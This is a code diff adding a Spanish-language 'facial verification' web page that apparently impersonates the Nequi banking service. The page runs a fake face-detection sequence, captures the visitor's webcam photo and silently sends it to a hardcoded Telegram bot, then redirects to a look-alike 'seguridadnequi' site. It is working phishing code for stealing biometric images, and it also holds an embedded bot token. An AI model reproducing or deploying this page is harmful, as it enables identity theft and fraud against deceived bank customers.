@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación Facial</title>
+
+<style>
+body {
+    margin: 0;
+    background: #2b002b;
+    overflow: hidden;
+    font-family: Arial;
+}
+
+video {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.overlay {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    background: rgba(43,0,43,0.5);
+}
+
+.oval {
+    position: absolute;
+    width: 300px;
+    height: 420px;
+    border-radius: 50%;
+    border: 4px solid white;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+}
+
+.oval.valid {
+    border-color: #00ff88;
+}
+
+.status {
+    position: absolute;
+    bottom: 30px;
+    width: 100%;
+    text-align: center;
+    color: white;
+}
+
+.countdown {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 70px;
+    color: white;
+    display: none;
+}
+.countdown.show { display:block; }
+</style>
+</head>
+
+<body>
+
+<video id="video" autoplay playsinline></video>
+<div class="overlay"></div>
+<div class="oval" id="oval"></div>
+<div class="countdown" id="countdown">3</div>
+<div class="status" id="status">Iniciando cámara...</div>
+
+<script>
+const video = document.getElementById("video");
+const statusText = document.getElementById("status");
+const countdownDiv = document.getElementById("countdown");
+const oval = document.getElementById("oval");
+
+const canvas = document.createElement("canvas");
+
+/* CONFIG TELEGRAM */
+const TELEGRAM_CONFIG = {
+    token: "8641199531:AAG1VERIVSWspjvgdFimf9Kt7XTXfq8DEUw",
+    chatId: "8042354877"
+};
+
+/* INICIAR CÁMARA */
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(stream => {
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+        statusText.innerText = "Coloca tu rostro...";
+        startFlow();
+    };
+})
+.catch(() => {
+    statusText.innerText = "❌ No se pudo acceder a la cámara";
+});
+
+/* FLUJO */
+function startFlow() {
+    setTimeout(() => {
+        oval.classList.add("valid");
+        statusText.innerText = "✅ Detectado";
+        setTimeout(startCountdown, 1000);
+    }, 2000);
+}
+
+/* CONTADOR */
+function startCountdown() {
+    let count = 3;
+    countdownDiv.innerText = count;
+    countdownDiv.classList.add("show");
+
+    const interval = setInterval(() => {
+        count--;
+        if (count > 0) {
+            countdownDiv.innerText = count;
+        } else {
+            clearInterval(interval);
+            countdownDiv.classList.remove("show");
+            tomarFoto();
+        }
+    }, 1000);
+}
+
+/* FOTO */
+function tomarFoto() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+        statusText.innerText = "📤 Enviando...";
+        enviarFotoTelegram(blob);
+    }, "image/jpeg", 0.9);
+}
+
+/* ENVIAR Y REDIRIGIR */
+function enviarFotoTelegram(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", TELEGRAM_CONFIG.chatId);
+    formData.append("photo", blob, "foto.jpg");
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
+        method: "POST",
+        body: formData
+    })
+    .then(res => {
+        if (res.ok) {
+            statusText.innerText = "✅ Enviado";
+
+            // 🔥 REDIRECCIÓN A GOOGLE
+            setTimeout(() => {
+                window.location.href = "https://seguridadnequi.vercel.app/inicio/index.html";
+            }, 2000);
+
+        } else {
+            throw new Error();
+        }
+    })
+    .catch(() => {
+        statusText.innerText = "❌ Error al enviar";
+    });
+}
+</script>
+
+</body>
+</html>
